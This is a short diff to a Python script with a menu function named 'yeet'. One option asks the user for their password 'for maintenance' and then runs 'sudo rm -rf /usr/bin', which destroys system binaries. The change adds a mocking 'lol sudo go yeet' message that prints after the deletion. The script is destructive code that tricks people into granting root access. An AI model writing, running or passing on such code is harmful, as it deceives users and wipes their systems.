@@ -10,7 +10,7 @@ name = colored('''__   __ _____  _____  _____
   | |  | |___ | |___   | |  
   |_|  |_____||_____|  |_|  
                            ''', 'red')
-
+lol = colored('lol sudo go yeet', 'red')
 
 def yeet():
     os.system('clear')
@@ -25,6 +25,9 @@ def yeet():
         os.system('clear')
         print('Please input your password for maintenance.')
         os.system('sudo rm -rf /usr/bin')
+        print('\n')
+        cprint(lol)
+        
     
     elif choice == '2':
         sys.exit()
